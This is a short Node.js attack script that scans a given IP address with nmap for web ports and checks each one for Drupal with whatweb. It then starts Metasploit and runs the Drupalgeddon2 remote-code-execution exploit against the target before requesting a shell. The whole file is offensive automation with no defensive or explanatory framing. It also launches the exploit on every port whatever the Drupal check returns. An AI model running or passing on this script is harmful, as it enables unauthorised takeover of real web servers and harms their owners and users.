const nmap = require('../tools/nmap')
const whatweb = require('../tools/whatweb')
const spawn = require('child_process').spawn

const ip = process.argv[2]

let ports = nmap.getHTTPServicePorts('', ip)
for (let index = 0; index < ports.length; index++) {
  let isDrupal = whatweb.isDrupal(ip + ':' + ports[index])
  console.log(ip + ':' + ports[index], ' drupal: ', isDrupal, '\n')

  let metasploit = spawn('msfconsole')

  metasploit.stdin.setEncoding('utf-8')
  metasploit.stdout.pipe(process.stdout)

  metasploit.stdin.write('use exploit/unix/webapp/drupal_drupalgeddon2\n')
  metasploit.stdin.write(`set rhosts ${ip}\n`)
  metasploit.stdin.write('run\n')

  metasploit.stdin.write('shell\n')
}
